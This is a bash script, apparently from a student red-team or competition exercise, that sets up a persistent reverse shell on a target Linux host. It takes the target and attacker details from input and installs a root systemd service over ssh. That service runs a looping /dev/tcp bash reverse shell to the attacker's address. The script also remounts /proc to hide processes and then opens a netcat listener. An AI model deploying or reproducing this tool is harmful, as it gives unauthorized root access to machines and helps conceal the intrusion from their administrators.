#!/bin/bash
#Gavin Hunsinger, Spring 2025, cdtfoxtro

# Define target details such as IP, user with sudo privileges, and user to ssh to
echo "Enter Target IP"
read target
TARGET_IP=$target
echo "Enter Target User"
read user
TARGET_USER=$user

#define your host IP and port desired for tagrte to try to connect to it is recommended that this port is not a reserved tcp port
echo "Enter Your IP"
read mine
ATTACKER_IP=$mine
echo "Enter Port"
read new_port
ATTACKER_PORT=$new_port

# Define the service name
SERVICE_NAME="shell"

# Define reverse shell payload that will be added as a system file in /etc/systemd/system/ on the target
REVERSE_SHELL=$(cat <<EOF
[Unit]
Description=Reverse Shell Persistence
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do bash -i </dev/tcp/$ATTACKER_IP/$ATTACKER_PORT >/dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 2>&1; sleep 10; done'
Restart=always
User=root

[Install]
WantedBy=multi-user.target
EOF
)


# Upload service file to target
echo "[*] Deploying reverse shell service on $TARGET_IP..."
ssh $TARGET_USER@$TARGET_IP "echo \"$REVERSE_SHELL\" | sudo tee /etc/systemd/system/$SERVICE_NAME.service > /dev/null"

# Enable and start the service
echo "[*] Enabling and starting the persistent service..."
ssh $TARGET_USER@$TARGET_IP "sudo systemctl daemon-reload && sudo systemctl enable $SERVICE_NAME && sudo systemctl start $SERVICE_NAME"

echo "[*] Hiding Processes from Target..."
ssh $TARGET_USER@$TARGET_IP "sudo mount -o remount,rw,nosuid,nodev,noexec,relatime,hidepid=1 /proc"

# Connecting to the reverse shell
echo "[*] Reverse shell service deployed! Waiting for connection..."
nc -lvp $ATTACKER_PORT
